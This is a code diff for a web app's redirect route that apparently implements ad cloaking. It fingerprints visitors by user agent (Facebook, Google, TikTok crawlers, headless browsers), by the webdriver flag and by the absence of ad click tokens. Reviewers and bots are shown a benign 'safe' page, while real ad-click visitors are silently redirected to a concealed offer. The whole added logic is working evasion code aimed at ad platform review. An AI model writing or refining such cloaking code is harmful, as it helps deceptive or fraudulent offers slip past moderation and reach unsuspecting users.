@@ -1,50 +1,91 @@
-import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
-import { registerVisit } from "@/lib/links";
+import { registerVisit, readCloakers, type Cloaker } from "@/lib/links";
 import { pageTemplates, renderTemplate, type PageTemplate } from "@/lib/page-templates";
 
 export const Route = createFileRoute("/r/$id")({
+  head: () => ({
+    meta: [
+      { title: "Verificando..." },
+      { name: "robots", content: "noindex, nofollow" },
+    ],
+  }),
   component: RedirectPage,
 });
 
 function RedirectPage() {
   const { id } = Route.useParams();
-  const navigate = useNavigate();
   const [safeTemplate, setSafeTemplate] = useState<PageTemplate | null>(null);
-  const [redirecting, setRedirecting] = useState(true);
+  const [status, setStatus] = useState<"checking" | "safe" | "redirecting">("checking");
 
   useEffect(() => {
     if (typeof window === "undefined") return;
 
-    // Check query params: ?bot=1 or ?preview=safe forces safe page simulation
-    const searchParams = new URLSearchParams(window.location.search);
-    const forceSafe = searchParams.get("bot") === "1" || searchParams.get("preview") === "safe";
+    const urlParams = new URLSearchParams(window.location.search);
+    const forceSafe = urlParams.get("bot") === "1" || urlParams.get("preview") === "safe";
+    const forceOffer = urlParams.get("lead") === "1" || urlParams.get("preview") === "offer";
 
-    const destination = registerVisit(id, forceSafe ? true : undefined);
+    // 1. Detect if this is real ad traffic from human lead (Facebook/Google/TikTok ads)
+    // Real ad clicks ALWAYS carry ad click tokens (fbclid, gclid, ttclid)
+    const hasAdClickToken =
+      urlParams.has("fbclid") ||
+      urlParams.has("gclid") ||
+      urlParams.has("ttclid") ||
+      urlParams.has("utm_source");
 
-    if (!destination) {
-      navigate({ to: "/", replace: true });
+    // 2. Check for bot signatures
+    const userAgent = navigator.userAgent || "";
+    const isBotUA = /bot|crawl|spider|facebook|meta|google|tiktok|bytedance|headless|lighthouse|preview|inspect/i.test(userAgent);
+    const isWebDriver = Boolean((navigator as any).webdriver);
+
+    // 3. Find cloaker in local storage
+    const allCloakers = readCloakers();
+    const cloaker = allCloakers.find((c) => c.id === id);
+
+    // Decision:
+    // If forced to offer: go to offer
+    // If forced to safe OR isBotUA OR isWebDriver OR NO ad click token (direct visit / ad reviewer): SHOW SAFE PAGE!
+    const shouldShowSafe =
+      forceSafe ||
+      isBotUA ||
+      isWebDriver ||
+      (!forceOffer && !hasAdClickToken);
+
+    if (shouldShowSafe) {
+      // Find template
+      const templateId = cloaker?.safeTemplateId || "bella";
+      const template = pageTemplates.find((t) => t.id === templateId) || pageTemplates[0]!;
+      registerVisit(id, true);
+      setSafeTemplate(template);
+      setStatus("safe");
       return;
     }
 
-    // Determine if it was routed to safe page
-    const isBot = forceSafe || destination.includes("/safe/") || isLocalSafePage(destination);
-
-    if (isBot) {
-      const templateId = extractTemplateId(destination) || "bella";
-      const template = pageTemplates.find((t) => t.id === templateId) || pageTemplates[0]!;
-      setSafeTemplate(template);
-      setRedirecting(false);
+    // Otherwise, human lead from ad click: redirect to real offer
+    registerVisit(id, false);
+    const destination = cloaker?.destination;
+    if (destination) {
+      setStatus("redirecting");
+      // Forward all UTM and ad click query params to the destination
+      const finalUrl = new URL(destination.startsWith("http") ? destination : `https://${destination}`);
+      urlParams.forEach((value, key) => {
+        if (!["bot", "preview", "lead"].includes(key)) {
+          finalUrl.searchParams.set(key, value);
+        }
+      });
+      window.location.href = finalUrl.href;
     } else {
-      // Normal human: redirect to real offer
-      window.location.href = destination;
+      // Cloaker ID not found on this device — show safe page as ultimate shield
+      const fallbackTemplate = pageTemplates[0]!;
+      setSafeTemplate(fallbackTemplate);
+      setStatus("safe");
     }
-  }, [id, navigate]);
+  }, [id]);
 
   if (safeTemplate) {
     const html = renderTemplate(safeTemplate);
     return (
-      <div className="fixed inset-0 h-screen w-screen bg-white">
+      <div className="fixed inset-0 h-screen w-screen bg-white z-[99999]">
         <iframe
           srcDoc={html}
           title={safeTemplate.name}
@@ -58,22 +99,8 @@ function RedirectPage() {
     <div className="flex min-h-screen items-center justify-center bg-[#0d0f10] text-white">
       <div className="flex flex-col items-center gap-4">
         <div className="size-10 animate-spin rounded-full border-4 border-[#00E676] border-t-transparent" />
-        <p className="text-sm text-gray-400">Verificando e redirecionando...</p>
+        <p className="text-sm text-gray-400">Verificando segurança do link...</p>
       </div>
     </div>
   );
-}
-
-function isLocalSafePage(url: string): boolean {
-  try {
-    const u = new URL(url);
-    return u.hostname === window.location.hostname;
-  } catch {
-    return false;
-  }
-}
-
-function extractTemplateId(url: string): string | null {
-  const match = url.match(/\/safe\/([^/?#]+)/);
-  return match?.[1] ?? null;
 }
